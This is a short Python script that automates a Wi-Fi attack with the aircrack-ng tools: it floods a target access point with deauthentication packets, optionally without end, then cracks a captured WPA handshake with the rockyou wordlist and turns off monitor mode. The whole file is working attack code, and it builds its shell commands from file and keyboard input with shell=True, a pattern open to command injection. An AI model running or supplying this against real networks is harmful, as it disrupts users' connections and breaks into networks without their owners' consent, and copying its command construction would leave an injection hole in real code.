import subprocess


def deauth_attack(bssid, wifi_card, attempt_num=1000):
    attempt_num = input('Write number of deauthorization attempts (0 means infinite): ')
    subprocess.run(f'aireplay-ng --deauth {attempt_num} -a {bssid} --ignore-negative-one {wifi_card}mon',
                   shell=True, text=True)


def crack_with_dictionary(bssid, filename):
    raw_data = subprocess.run(f'aircrack-ng -w rockyou.txt -b {bssid} {filename}-01.cap',
                              shell=True, text=True, stdout=subprocess.PIPE)
    raw_text = raw_data.stdout
    print(raw_data)


def disable_monitor_mode(wifi_card):
    subprocess.run(f'airmon-ng stop {wifi_card}mon', shell=True, text=True)


if __name__ == '__main__':
    with open('random_file_name_with_logs.txt', 'r') as f:
        bssid = f.readline().strip()
        filename = f.readline().strip()
        wifi_card = f.readline().strip()

        deauth_attack(bssid, wifi_card, 0)
        crack_with_dictionary(bssid, filename)

    # final stage of cracking. Disabling monitor mod
    disable_monitor_mode(wifi_card)
